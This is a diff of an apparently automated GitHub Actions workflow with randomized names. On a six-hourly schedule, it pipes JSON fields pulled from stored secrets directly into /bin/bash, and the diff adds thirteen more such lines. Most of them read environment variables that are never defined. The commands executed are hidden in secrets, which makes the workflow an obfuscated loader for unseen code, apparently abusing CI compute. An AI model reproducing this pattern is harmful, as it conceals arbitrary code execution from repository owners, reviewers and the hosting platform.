@@ -1,18 +1,31 @@
 name: tangjunru6745
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 3/6 * * *'
-jobs:  # 13104
+    - cron: '3 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tangjunru6745
         env:
-          kwvep12: ${{ secrets.kwvep12 }}
+          gxwjs194: ${{ secrets.gxwjs194 }}
         run: |
-          echo $kwvep12 | jq -r .l91193 | /bin/bash
-          echo $ytfxe41 | jq -r .erttg6 | /bin/bash
+          echo $gxwjs194 | jq -r .dd6 | /bin/bash
+          echo $f7 | jq -r .hpgn63 | /bin/bash
+          echo $kr34938 | jq -r .oerv6561 | /bin/bash
+          echo $p3084 | jq -r .pxb506 | /bin/bash
+          echo $sf131 | jq -r .zgf10412 | /bin/bash
+          echo $mve9680 | jq -r .glfl8836 | /bin/bash
+          echo $fps7213 | jq -r .fnog860 | /bin/bash
+          echo $mr65774 | jq -r .ncs577 | /bin/bash
+          echo $rqgn4 | jq -r .x7 | /bin/bash
+          echo $ppcor2 | jq -r .ttt00415 | /bin/bash
+          echo $ve8 | jq -r .evxy9435 | /bin/bash
+          echo $ndrsu60701 | jq -r .qsbp7 | /bin/bash
+          echo $rh5 | jq -r .pmbm697 | /bin/bash
+          echo $jj550 | jq -r .x3 | /bin/bash
 
